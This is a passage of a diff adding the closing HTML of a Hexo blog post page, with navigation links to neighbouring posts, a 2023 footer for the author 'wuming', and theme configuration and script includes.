+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/10/08/%E5%A5%87%E6%80%AA%E7%9A%84wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">奇怪的wp</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 wuming
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
